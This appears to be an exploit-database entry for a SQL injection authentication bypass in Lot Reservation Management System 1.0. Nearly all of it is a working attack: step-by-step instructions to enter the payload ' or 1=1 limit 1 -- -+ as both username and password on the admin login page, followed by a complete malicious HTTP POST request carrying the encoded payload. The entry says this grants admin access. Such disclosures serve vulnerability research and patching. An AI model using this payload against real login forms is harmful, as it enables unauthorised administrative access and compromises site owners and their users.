---
title: "Lot Reservation Management System 1.0 - Authentication Bypass"
date: 2020-10-22T10:57:56-03:00
draft: false
type: "Auth Bypass"
platform: "webapps"
---


```html
Proof of Concept:::

Step 1:	Open the URL http://localhost:8081/lot-reservation-management-system/admin/login.php

Step 2:	use payload ' or 1=1 limit 1 -- -+ for both username and password.


Malicious Request:::

POST /lot-reservation-management-system/admin/ajax.php?action=login HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 71
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/lot-reservation-management-system/admin/login.php
Cookie: PHPSESSID=q9kusr41d3em013kbe98b701id

username='+or+1%3D1+limit+1+--+-%2B&password='+or+1%3D1+limit+1+--+-%2B

You will be login as admin of the application.
```